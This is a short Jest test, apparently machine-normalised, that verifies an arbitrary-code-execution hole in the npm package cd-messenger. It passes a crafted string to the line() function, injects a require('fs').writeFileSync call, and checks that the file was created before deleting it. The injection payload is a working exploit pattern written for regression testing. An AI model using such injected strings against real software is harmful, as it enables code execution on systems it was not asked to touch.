const v21 = () => {
    const v12 = expect.assertions(2);
    v12;
    const fs = require('fs');
    const a = require('cd-messenger');
    const path = './cd-messenger';
    const v13 = 'red(); require(\'fs\').writeFileSync(\'' + path;
    let payload = v13 + '\',``); //';
    data = {};
    file_exist = fs.existsSync(path);
    const v14 = expect(file_exist);
    const v15 = v14.toBe(false);
    v15;
    try {
        const v16 = a.line(payload);
        v16;
    } catch (error) {
    }
    file_exist = fs.existsSync(path);
    const v17 = expect(file_exist);
    const v18 = v17.toBe(true);
    v18;
    const v19 = function (err) {
    };
    const v20 = fs.unlink(path, v19);
    v20;
};
const v22 = test('Arbitrary code execution in cd-messenger', v21);
v22;